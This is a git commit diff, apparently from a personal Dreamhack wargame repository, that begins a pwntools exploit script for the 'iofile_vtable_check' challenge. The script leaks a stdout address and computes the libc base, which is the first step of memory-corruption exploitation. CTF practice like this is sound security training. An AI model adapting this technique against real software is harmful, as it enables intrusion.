2be9159988b48e3181cfd40ab5ed5b0990231389
Brian <hibrian827@gmail.com>
2025-08-07 16:59:27 +0900

    starting iofile_vtable_check

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -1,4 +1,18 @@
 from pwn import *
 
-env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/xrop/problem/deploy/libc.so.6"}
-rem = process("./Pwnable/xrop/problem/deploy/prob", env=env)
+context.terminal = ['tmux', 'new-window']
+
+env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/iofile_vtable_check/problem/libc.so.6"}
+rem = process("./Pwnable/iofile_vtable_check/problem/iofile_vtable_check", env=env)
+
+# gdb.attach(rem)
+
+lib = ELF("./Pwnable/iofile_vtable_check/problem/libc.so.6")
+
+rem.recvuntil(b"stdout: ")
+temp = rem.recvn(14)
+print(temp)
+print(hex(int(temp, 16)))
+lib_base = int(temp, 16) - lib.symbols['_IO_2_1_stdout_']
+
+print(hex(lib_base))
